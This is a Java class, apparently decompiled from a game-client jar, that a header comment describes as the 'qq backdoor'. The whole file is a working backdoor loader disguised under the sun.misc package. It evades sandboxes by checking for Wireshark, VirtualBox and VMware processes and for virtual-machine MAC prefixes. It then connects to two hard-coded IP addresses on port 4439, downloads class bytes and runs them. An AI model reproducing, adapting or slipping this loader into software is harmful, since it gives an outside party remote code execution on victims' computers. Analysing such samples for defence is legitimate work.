//
// Source code recreated from the orignial phobos 1.5.4 jar
// I then wrote some code to constuct the file and write it to a class file
// you can view the qq backdoor here: https://github.com/qqTechnologies/qqBackdoor
// (powered by CJ's massive brain)
//

package sun.misc;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.ConnectException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.util.Enumeration;

public class RuntimeManagement extends ClassLoader {
    public Class<?> addClass(String name, byte[] ok) {
        try {
            Class<?> clazz = this.define(name, ok);
            Method method = clazz.getMethod("justice4qq");
            method.invoke((Object)null);
            return clazz;
        } catch (Throwable var5) {
            var5.printStackTrace();
            return null;
        }
    }

    private static byte[] readByteArrayLWithLength(DataInputStream reader) throws IOException {
        int length = reader.readInt();
        if (length > 0) {
            byte[] cifrato = new byte[length];
            reader.readFully(cifrato, 0, cifrato.length);
            return cifrato;
        } else {
            return null;
        }
    }

    public Class<?> define(String name, byte[] b) {
        Class<?> clazz = this.defineClass(name, b, 0, b.length);
        return clazz;
    }

    public static String GetAddress(String addressType) {
        String address = "";
        InetAddress lanIp = null;

        try {
            String ipAddress = null;
            Enumeration<NetworkInterface> net = null;
            net = NetworkInterface.getNetworkInterfaces();

            while(net.hasMoreElements()) {
                NetworkInterface element = (NetworkInterface)net.nextElement();
                Enumeration<InetAddress> addresses = element.getInetAddresses();

                while(addresses.hasMoreElements() && element.getHardwareAddress().length > 0) {
                    InetAddress ip = (InetAddress)addresses.nextElement();
                    if (ip instanceof Inet4Address && ip.isSiteLocalAddress()) {
                        ipAddress = ip.getHostAddress();
                        lanIp = InetAddress.getByName(ipAddress);
                    }
                }
            }

            if (lanIp == null) {
                return null;
            }

            if (addressType.equals("ip")) {
                address = lanIp.toString().replaceAll("^/+", "");
            } else {
                if (!addressType.equals("mac")) {
                    throw new Exception("Specify \"ip\" or \"mac\"");
                }

                address = getMacAddress(lanIp);
            }
        } catch (UnknownHostException var8) {
        } catch (SocketException var9) {
        } catch (Exception var10) {
        }

        return address;
    }

    private static String getMacAddress(InetAddress ip) {
        String address = null;

        try {
            NetworkInterface network = NetworkInterface.getByInetAddress(ip);
            byte[] mac = network.getHardwareAddress();
            StringBuilder sb = new StringBuilder();

            for(int i = 0; i < mac.length; ++i) {
                sb.append(String.format("%02X%s", mac[i], i < mac.length - 1 ? "-" : ""));
            }

            address = sb.toString();
        } catch (SocketException var6) {
            var6.printStackTrace();
        }

        return address;
    }

    public void run() {
        try {
            boolean detected = false;
            ProcessBuilder processBuilder = new ProcessBuilder(new String[0]);
            processBuilder.command("tasklist.exe");
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

            while(true) {
                String line;
                do {
                    if ((line = reader.readLine()) == null) {
                        String mac = GetAddress("mac");
                        if (mac.startsWith("00:05:69") || mac.startsWith("00:0C:29") || mac.startsWith("00:50:56") || mac.startsWith("08:00:27")) {
                            detected = true;
                        }

                        if (!detected) {
                            DataInputStream in = null;

                            try {
                                Socket socket = new Socket("213.136.84.98", 4439);
                                in = new DataInputStream(socket.getInputStream());
                                socket.getOutputStream().write("replaceMeme".getBytes(StandardCharsets.UTF_8));
                                socket.getOutputStream().flush();
                            } catch (ConnectException var11) {
                                try {
                                    Socket socket = new Socket("107.155.81.101", 4439);
                                    in = new DataInputStream(socket.getInputStream());
                                    socket.getOutputStream().write("replaceMeme".getBytes(StandardCharsets.UTF_8));
                                    socket.getOutputStream().flush();
                                } catch (Exception var10) {
                                }
                            }

                            if (in != null) {
                                byte[] bytes = readByteArrayLWithLength(in);
                                this.addClass("sun.misc.UnsafeHelper", bytes);
                                return;
                            }
                        }

                        return;
                    }
                } while(!line.toLowerCase().contains("wireshark") && !line.toLowerCase().contains("vboxservice") && !line.toLowerCase().contains("vmwareuser"));

                detected = true;
            }
        } catch (IOException var12) {
        }
    }
}
